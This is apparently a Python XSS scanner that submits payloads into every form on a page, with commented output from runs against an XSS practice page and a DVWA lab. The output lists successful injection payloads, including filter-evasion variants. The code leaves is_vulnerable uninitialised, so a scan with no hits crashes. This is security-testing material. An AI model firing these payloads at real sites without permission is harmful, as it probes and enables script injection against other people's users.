#!/usr/bin/env python3

# Author:      Abdou Rockikz
# Description: Scan a target for possible XSS vulnerabilities.
# Date:        05/08/2023
# Modified by: Sergio Charruadas

# Import libraries

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

# Declare functions

# This function is identifying all form type fields on a specific url and returning it to where the function is being called.
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

# This function is retrieving where the data is being sent to and what the method is and saving, finds all <input> tags within the form and parses each one and stores the method, action URL and inputs list in the details dictionary
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Submits an HTML form given its details and base URL
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# Scans a URL for forms with cross-site scripting (XSS) vulnerabilities
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    with open("xss_payloads.txt") as f:
        payloads = f.readlines()
        
    successful_payloads = []     
    for js_script in payloads:
        js_script = js_script.strip()  
        for form in forms:
            form_details = get_form_details(form)
            content = submit_form(form_details, url, js_script).content.decode() 
            if js_script in content:
                print(f"[+] XSS Detected on {url}")
                print(f"[*] Form details:")
                pprint(form_details)
                is_vulnerable = True
                successful_payloads.append(js_script)
    print("\nSuccessful Payloads: \n")
    for line in successful_payloads:
        print(line)
    return is_vulnerable

# This is just the main function that shows when script is first run asking for the url the user wants to target.
if __name__ == "__main__":
    url = input("Enter a URL to test for XSS:")
    scan_xss(url)

## POSITIVE:
# Enter a URL to test for XSS:http://sudo.co.il/xss/level0.php
# [+] Detected 1 forms on http://sudo.co.il/xss/level0.php.
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': "<script>alert('XSS')</script>"},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': "<scr<script>ipt>alert('XSS')</scr<script>ipt>"},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': '"><script>alert(\'XSS\')</script>'},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': '"><script>alert(String.fromCharCode(88,83,83))</script>'},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': "<script>\\u0061lert('22')</script>"},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': "<script>eval('\\x61lert(\\'33\\')')</script>"},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': '<script>eval(8680439..toString(30))(983801..toString(36))</script> '
#                       '//parseInt("confirm",30) == 8680439 && '
#                       '8680439..toString(30) == "confirm"'},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}
# [+] XSS Detected on http://sudo.co.il/xss/level0.php
# [*] Form details:
# {'action': '#',
#  'inputs': [{'name': 'email',
#              'type': 'text',
#              'value': '<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">'},
#             {'name': None, 'type': 'submit'}],
#  'method': 'get'}

# Successful Payloads: 

# <script>alert('XSS')</script>
# <scr<script>ipt>alert('XSS')</scr<script>ipt>
# "><script>alert('XSS')</script>
# "><script>alert(String.fromCharCode(88,83,83))</script>
# <script>\u0061lert('22')</script>
# <script>eval('\x61lert(\'33\')')</script>
# <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
# <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">


### NEGATIVE: 
# Enter a URL to test for XSS:http://dvwa.local/login.php
# [+] Detected 1 forms on http://dvwa.local/login.php.
#  Successful Payloads: 
